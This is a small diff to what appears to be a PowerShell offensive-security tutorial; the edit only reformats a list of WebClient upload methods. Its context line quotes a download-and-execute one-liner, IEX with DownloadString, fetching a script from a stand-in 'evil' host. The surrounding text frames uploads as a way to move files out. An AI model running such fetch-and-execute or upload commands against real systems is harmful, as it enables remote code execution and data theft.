@@ -86,7 +86,7 @@ IEX (New-Object Net.WebClient).downloadstring("http://evil.file.com/pwnagestego.
 Just as we can download files, we can upload them as well. System.Net.WebClient offers methods for this such as
 
 System.Net.WebClient
--UploadString
--UploadFile
--UploadData
--and more too!
+- UploadString
+- UploadFile
+- UploadData
+- and more too!
